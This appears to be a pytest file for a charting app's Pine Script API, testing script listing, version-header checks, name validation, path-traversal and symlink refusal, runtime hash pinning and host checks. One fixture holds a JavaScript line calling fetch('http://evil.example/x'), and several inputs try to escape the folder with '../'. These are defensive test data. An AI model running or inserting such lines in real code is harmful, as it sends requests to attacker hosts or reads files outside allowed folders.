"""The Pine routes (homebase/charts/pineapi.py): the script list and text from a temp folder, names that
leave the folder refused, and the runtime file served only when it is the pinned build."""
from __future__ import annotations

import datetime as dt
import hashlib
import os

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from homebase.charts import pineapi as P
from homebase.charts.server import create_app
from tests.charts_util import D, rows, session_ms, write_archive

RSI = '//@version=6\nindicator("RSI twin", overlay=false)\nplot(ta.rsi(close, 14))\n'
STRAT = "//@version=5\nstrategy(title='Sniper', overlay=true)\nplot(close)\n"


def client(tmp_path, monkeypatch, scripts=None, runtime: bytes | None = None):
    monkeypatch.setenv(P.ENV, str(tmp_path))
    sd = tmp_path / "scripts"
    sd.mkdir(parents=True)
    for name, text in (scripts or {}).items():
        (sd / name).write_text(text)
    if runtime is not None:
        rp = P.runtime_path()
        rp.parent.mkdir(parents=True)
        rp.write_bytes(runtime)
    app = FastAPI()
    app.include_router(P.routes())
    return TestClient(app, base_url="http://localhost:8852")


def test_list_reads_version_kind_and_title_and_skips_other_files(tmp_path, monkeypatch):
    with client(tmp_path, monkeypatch, {"rsi.pine": RSI, "my strat.pine": STRAT, "notes.txt": "x"}) as c:
        got = c.get("/api/pine/scripts").json()
    assert got == [{"name": "my strat.pine", "version": 5, "kind": "strategy", "title": "Sniper"},
                   {"name": "rsi.pine", "version": 6, "kind": "indicator", "title": "RSI twin"}]


# no marker the runtime sees = the Worker would run the text as raw JavaScript (review finding): never listed, never served
NO_MARKER = {"old.pine": "// no header\nplot(close)\n",
             "js.pine": "($) => { fetch('http://evil.example/x'); return {}; }",
             "trail.pine": "//@version=6 foo\nindicator('x')\nplot(close)\n",
             "inline.pine": "plot(close) //@version=6\n"}


def test_a_script_without_the_runtimes_version_line_is_neither_listed_nor_served(tmp_path, monkeypatch):
    with client(tmp_path, monkeypatch, {"rsi.pine": RSI, **NO_MARKER}) as c:
        assert [s["name"] for s in c.get("/api/pine/scripts").json()] == ["rsi.pine"]
        for name in NO_MARKER:
            r = c.get(f"/api/pine/scripts/{name}")
            assert r.status_code == 404 and "//@version" in r.json()["detail"], name
        assert c.get("/api/pine/scripts/rsi.pine").status_code == 200


def test_the_version_line_is_the_runtimes_own_test():
    ok = ["//@version=5\nx", "  //  @VERSION = 6  \nx", "// c\n//@version=6\r\nindicator('x')", "//@version=5"]
    bad = ["//@version=5x", "//@version=\u0665\n", "//@version 5\n", "x //@version=5\n", ""]
    assert all(P.script_meta("a.pine", t)["version"] is not None for t in ok), ok
    assert all(P.script_meta("a.pine", t)["version"] is None for t in bad), bad


def test_a_utf8_bom_is_not_part_of_the_script(tmp_path, monkeypatch):
    sd = tmp_path / "scripts"
    with client(tmp_path, monkeypatch) as c:
        (sd / "bom.pine").write_bytes(b"\xef\xbb\xbf" + RSI.encode())
        assert [s["name"] for s in c.get("/api/pine/scripts").json()] == ["bom.pine"]
        assert c.get("/api/pine/scripts/bom.pine").text == RSI


def test_list_is_empty_without_the_folder(tmp_path, monkeypatch):
    monkeypatch.setenv(P.ENV, str(tmp_path / "none"))
    assert P.list_scripts() == []


def test_study_counts_as_an_indicator():
    assert P.script_meta("a.pine", '//@version=4\nstudy("Old")\n')["kind"] == "indicator"


def test_read_returns_the_text(tmp_path, monkeypatch):
    with client(tmp_path, monkeypatch, {"rsi.pine": RSI}) as c:
        r = c.get("/api/pine/scripts/rsi.pine")
    assert r.status_code == 200 and r.text == RSI
    assert r.headers["content-type"].startswith("text/plain")


def test_unknown_and_bad_names_are_404(tmp_path, monkeypatch):
    with client(tmp_path, monkeypatch, {"rsi.pine": RSI}) as c:
        assert c.get("/api/pine/scripts/none.pine").status_code == 404
        assert c.get("/api/pine/scripts/rsi.py").status_code == 404
        assert c.get("/api/pine/scripts/..%2Frsi.pine").status_code == 404
        assert c.get("/api/pine/scripts/scripts%2Frsi.pine").status_code == 404


def test_the_name_rule_takes_any_letter_up_to_255_characters(tmp_path, monkeypatch):
    """catalog.js PINE_NAME is this rule (tests/js/catalog.test.mjs holds the same table): a name the server lists must survive the client."""
    long_ok, long_bad = "x" * 250 + ".pine", "x" * 251 + ".pine"
    good = ["a.pine", "my ema-2.v3.pine", "\u00e9.pine", "\u6307\u6807.pine", long_ok]
    bad = ["a.py", ".pine", "a/b.pine", "..\\a.pine", "a.pine\n", "a\n.pine", "a\x00.pine", "a$.pine", long_bad]
    assert all(P.NAME_RE.match(n) for n in good), good
    assert not any(P.NAME_RE.match(n) for n in bad), bad
    with client(tmp_path, monkeypatch, {"\u00e9.pine": RSI}) as c:
        assert [s["name"] for s in c.get("/api/pine/scripts").json()] == ["\u00e9.pine"]
        assert c.get("/api/pine/scripts/%C3%A9.pine").text == RSI


def test_a_link_out_of_the_folder_is_neither_listed_nor_read(tmp_path, monkeypatch):
    with client(tmp_path, monkeypatch, {"rsi.pine": RSI}) as c:
        (tmp_path / "secret.pine").write_text(RSI.replace("RSI twin", "Outside Title"))
        os.symlink(tmp_path / "secret.pine", tmp_path / "scripts" / "link.pine")
        os.symlink(tmp_path / "scripts" / "rsi.pine", tmp_path / "scripts" / "same.pine")   # a link that stays inside is fine
        os.symlink(tmp_path / "scripts" / "loop.pine", tmp_path / "scripts" / "loop.pine")
        got = c.get("/api/pine/scripts").json()
        assert [s["name"] for s in got] == ["rsi.pine", "same.pine"]
        assert "Outside Title" not in str(got)
        assert c.get("/api/pine/scripts/link.pine").status_code == 404
        assert c.get("/api/pine/scripts/loop.pine").status_code == 404


def test_a_name_that_resolves_outside_the_folder_is_refused(tmp_path, monkeypatch):
    with client(tmp_path, monkeypatch, {"rsi.pine": RSI}) as c:
        (tmp_path / "secret.pine").write_text("outside")
        os.symlink(tmp_path / "secret.pine", tmp_path / "scripts" / "link.pine")
        assert c.get("/api/pine/scripts/link.pine").status_code == 404
        assert P.script_path("link.pine") is None
        assert P.script_path("../secret.pine") is None
        assert P.script_path("rsi.pine") == (tmp_path / "scripts" / "rsi.pine").resolve()


def test_runtime_404_when_missing_or_not_the_pinned_build(tmp_path, monkeypatch):
    with client(tmp_path, monkeypatch) as c:
        assert c.get("/api/pine/runtime.js").status_code == 404
    with client(tmp_path / "b", monkeypatch, runtime=b"var PineTS = 1;") as c:
        r = c.get("/api/pine/runtime.js")
    assert r.status_code == 404 and "pinned" in r.json()["detail"]


def test_runtime_served_when_the_hash_matches(tmp_path, monkeypatch):
    body = b"var PineTS = {};"
    monkeypatch.setattr(P, "RUNTIME_SHA256", hashlib.sha256(body).hexdigest())
    with client(tmp_path, monkeypatch, runtime=body) as c:
        r = c.get("/api/pine/runtime.js")
    assert r.status_code == 200 and r.content == body
    assert r.headers["content-type"].startswith("application/javascript")


def test_routes_refuse_a_foreign_host(tmp_path, monkeypatch):
    with client(tmp_path, monkeypatch, {"rsi.pine": RSI}) as c:
        assert c.get("/api/pine/scripts", headers={"host": "evil.example"}).status_code == 403


@pytest.mark.skipif(not P.runtime_path().is_file(), reason="the Pine runtime is not installed on this machine")
def test_the_installed_runtime_is_the_pinned_build():
    assert hashlib.sha256(P.runtime_path().read_bytes()).hexdigest() == P.RUNTIME_SHA256


def test_the_chart_app_serves_the_pine_routes(tmp_path, monkeypatch):
    """create_app registers pineapi.routes(): the script list and text reach the page through the real app."""
    monkeypatch.setenv(P.ENV, str(tmp_path / "pine"))
    (tmp_path / "pine" / "scripts").mkdir(parents=True)
    (tmp_path / "pine" / "scripts" / "rsi.pine").write_text(RSI)
    body = b"var PineTS = {};"
    monkeypatch.setattr(P, "RUNTIME_SHA256", hashlib.sha256(body).hexdigest())
    P.runtime_path().parent.mkdir(parents=True)
    P.runtime_path().write_bytes(body)
    base = tmp_path / "ticks"
    write_archive(base, "NQ", D, "NQZ6", rows(session_ms(D, 9, 29), [200.0 + 0.25 * (i % 4) for i in range(60)]))
    app = create_app(roots=["NQ"], base=base, replay=D, speed=1, start_et=dt.time(9, 30), state=tmp_path / "state")
    with TestClient(app, base_url="http://127.0.0.1:8852") as c:
        assert c.get("/api/pine/scripts").json() == [{"name": "rsi.pine", "version": 6, "kind": "indicator", "title": "RSI twin"}]
        assert c.get("/api/pine/scripts/rsi.pine").text == RSI
        assert c.get("/api/pine/runtime.js").content == body
